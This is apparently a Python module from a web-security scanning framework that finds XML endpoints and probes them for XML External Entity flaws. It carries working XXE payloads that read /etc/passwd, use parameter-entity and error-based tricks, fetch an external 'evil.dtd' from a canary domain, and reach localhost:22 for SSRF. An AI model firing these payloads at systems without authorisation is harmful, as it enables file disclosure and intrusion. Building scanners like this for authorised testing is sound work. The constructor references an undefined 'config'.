#!/usr/bin/env python3

from typing import Dict, List, Optional, Tuple
import requests
import re
from core.base_module import VulnerabilityTestingModule
from core.utils import make_http_request, generate_random_string, make_request

class XXEScanner(VulnerabilityTestingModule):
    """XML External Entity (XXE) vulnerability scanner module for PIN0CCHI0."""

    def __init__(self):
        super().__init__(config)
        self.name = "xxe_scanner"
        self.description = "Tests for XML External Entity (XXE) vulnerabilities"
        self.author = "PIN0CCHI0 Framework"
        self.references = [
            "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
            "https://portswigger.net/web-security/xxe"
        ]
        self.vulnerabilities = []
        self.test_payloads = self._generate_test_payloads()

    def _generate_test_payloads(self) -> List[Dict]:
        """Generate test payloads for XXE testing.

        Returns:
            List of payload dictionaries containing XML content and expected indicators
        """
        random_str = generate_random_string(8)
        canary_domain = f"{random_str}.example.com"

        return [
            # Classic XXE
            {
                'payload': f'''<?xml version="1.0" encoding="UTF-8"?>
                    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
                    <root>&xxe;</root>''',
                'indicators': ['root:', 'nobody:', '/bin/bash']
            },
            # Blind XXE using DNS lookup
            {
                'payload': f'''<?xml version="1.0" encoding="UTF-8"?>
                    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://{canary_domain}"> ]>
                    <root>&xxe;</root>''',
                'indicators': ['Connection refused', 'Connection timed out']
            },
            # Parameter entities
            {
                'payload': f'''<?xml version="1.0" encoding="UTF-8"?>
                    <!DOCTYPE test [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>
                    <root>test</root>''',
                'indicators': ['root:', 'nobody:', '/bin/bash']
            },
            # Error-based XXE
            {
                'payload': f'''<?xml version="1.0" encoding="UTF-8"?>
                    <!DOCTYPE test [ <!ENTITY % file SYSTEM "file:///etc/passwd">
                    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
                    %eval;
                    %error; ]>
                    <root>test</root>''',
                'indicators': ['root:', 'nobody:', 'No such file or directory']
            },
            # XXE using external DTD
            {
                'payload': f'''<?xml version="1.0" encoding="UTF-8"?>
                    <!DOCTYPE test SYSTEM "http://{canary_domain}/evil.dtd">
                    <root>test</root>''',
                'indicators': ['Connection refused', 'Connection timed out']
            },
            # XXE to SSRF
            {
                'payload': f'''<?xml version="1.0" encoding="UTF-8"?>
                    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://localhost:22"> ]>
                    <root>&xxe;</root>''',
                'indicators': ['SSH-', 'OpenSSH']
            }
        ]

    def detect_xml_endpoint(self, response: requests.Response) -> bool:
        """Detect if the endpoint accepts XML input.

        Args:
            response: HTTP response object

        Returns:
            bool: True if endpoint likely accepts XML, False otherwise
        """
        content_type = response.headers.get('Content-Type', '').lower()
        return any([
            'xml' in content_type,
            'soap' in content_type,
            '<\?xml' in response.text,
            'xmlns' in response.text,
            '</xml>' in response.text
        ])

    def test_endpoint(self, url: str, method: str = "POST", headers: Dict = None) -> Optional[Dict]:
        """Test an endpoint for XXE vulnerabilities.

        Args:
            url: Target URL
            method: HTTP method (default: POST)
            headers: Custom headers to use

        Returns:
            Dict containing vulnerability details if found, None otherwise
        """
        if not headers:
            headers = {}

        # Add XML content type if not present
        if 'Content-Type' not in headers:
            headers['Content-Type'] = 'application/xml'

        for test_case in self.test_payloads:
            try:
                response = make_http_request(
                    url,
                    method=method,
                    data=test_case['payload'],
                    headers=headers
                )

                if response:
                    # Check for indicators in response
                    for indicator in test_case['indicators']:
                        if indicator in response.text:
                            return {
                                "type": "XML External Entity (XXE)",
                                "url": url,
                                "method": method,
                                "payload": test_case['payload'],
                                "evidence": indicator,
                                "severity": "High",
                                "description": "XXE vulnerability found that could lead to information disclosure or server-side request forgery",
                                "mitigation": "Disable XML external entity processing and implement proper XML parsing security controls"
                            }

            except Exception as e:
                self.logger.error(f"Error testing XXE payload: {str(e)}")

        return None

    def discover_xml_endpoints(self, url: str) -> List[Dict]:
        """Discover endpoints that might accept XML input.

        Args:
            url: Target URL

        Returns:
            List of dicts containing endpoint information
        """
        endpoints = []

        try:
            # Check the main URL
            response = make_http_request(url, method="GET", headers=self.config.get("headers", {}))
            if response and self.detect_xml_endpoint(response):
                endpoints.append({
                    'url': url,
                    'method': 'POST',
                    'headers': {'Content-Type': 'application/xml'}
                })

            # Parse HTML to find potential XML endpoints
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')

            # Look for forms that might accept XML
            for form in soup.find_all('form'):
                form_url = form.get('action', '')
                if form_url:
                    if not form_url.startswith('http'):
                        form_url = url.rstrip('/') + '/' + form_url.lstrip('/')
                    
                    # Check if form accepts XML
                    form_response = make_http_request(form_url, method="GET")
                    if form_response and self.detect_xml_endpoint(form_response):
                        endpoints.append({
                            'url': form_url,
                            'method': form.get('method', 'POST').upper(),
                            'headers': {'Content-Type': 'application/xml'}
                        })

            # Common XML endpoint paths
            common_paths = [
                '/api/xml',
                '/soap',
                '/wsdl',
                '/xml-rpc',
                '/api/v1/xml',
                '/service',
                '/ws'
            ]

            for path in common_paths:
                test_url = url.rstrip('/') + path
                response = make_http_request(test_url, method="GET")
                if response and self.detect_xml_endpoint(response):
                    endpoints.append({
                        'url': test_url,
                        'method': 'POST',
                        'headers': {'Content-Type': 'application/xml'}
                    })

        except Exception as e:
            self.logger.error(f"Error discovering XML endpoints: {str(e)}")

        return endpoints

    def run(self, target: str) -> bool:
        """Run the XXE scanner module.

        Args:
            target: Target URL or domain

        Returns:
            bool: True if the scan completed successfully
        """
        self.logger.info(f"Starting XXE scan on {target}")

        try:
            # Discover XML endpoints
            endpoints = self.discover_xml_endpoints(target)
            self.logger.info(f"Discovered {len(endpoints)} potential XML endpoints")

            # Test each endpoint
            for endpoint in endpoints:
                result = self.test_endpoint(
                    endpoint['url'],
                    method=endpoint['method'],
                    headers=endpoint['headers']
                )
                if result:
                    self.vulnerabilities.append(result)

            self.logger.info(f"XXE scan completed. Found {len(self.vulnerabilities)} vulnerabilities.")
            return True

        except Exception as e:
            self.logger.error(f"Error during XXE scan: {str(e)}")
            return False

    def cleanup(self) -> bool:
        """Clean up the XXE scanner module."""
        self.logger.info("Cleaning up XXE scanner module...")
        return True